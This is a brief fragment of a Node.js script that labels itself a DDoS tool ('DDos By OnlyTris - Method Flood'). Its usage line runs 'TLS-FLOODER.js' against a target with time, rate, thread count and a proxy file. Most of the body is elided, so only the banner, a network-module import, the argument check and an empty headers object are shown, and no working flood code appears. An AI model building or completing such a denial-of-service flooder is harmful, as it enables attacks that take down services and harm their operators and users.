console.log("DDos By OnlyTris - Method Flood");
const net = require("net");
 ...
 if (process.argv.length < 7){console.log(`Usage: node TLS-FLOODER.js target time rate thread proxyfile`); process.exit();}
 const headers = {};
